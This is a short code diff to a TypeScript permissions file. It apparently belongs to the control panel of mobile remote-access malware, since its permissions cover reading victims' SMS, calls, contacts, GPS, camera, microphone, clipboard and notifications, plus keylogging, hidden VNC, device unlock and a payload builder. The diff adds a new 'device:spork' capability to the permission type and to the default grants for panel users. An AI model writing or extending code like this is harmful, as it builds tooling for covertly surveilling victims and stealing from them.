@@ -21,6 +21,7 @@ export type Permission =
   | 'device:unlock'
   | 'device:command'
   | 'device:delete'
+  | 'device:spork'
   | 'builder:access'
   | 'logs:view'
   | 'logs:clear'
@@ -33,7 +34,7 @@ export const ALL_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
   'device:contacts', 'device:gps', 'device:camera', 'device:mic',
   'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
-  'device:permissions', 'device:apps', 'device:fason',
+  'device:permissions', 'device:apps', 'device:fason', 'device:spork',
   'device:hvnc', 'device:inspector', 'device:keylogger', 'device:unlock',
   'device:command', 'device:delete',
   'builder:access', 'logs:view', 'logs:clear', 'users:manage',
@@ -43,7 +44,7 @@ export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
   'device:contacts', 'device:gps', 'device:camera', 'device:mic',
   'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
-  'device:permissions', 'device:apps', 'device:fason',
+  'device:permissions', 'device:apps', 'device:fason', 'device:spork',
   'device:hvnc', 'device:inspector',
   'device:command',
   'settings:view',
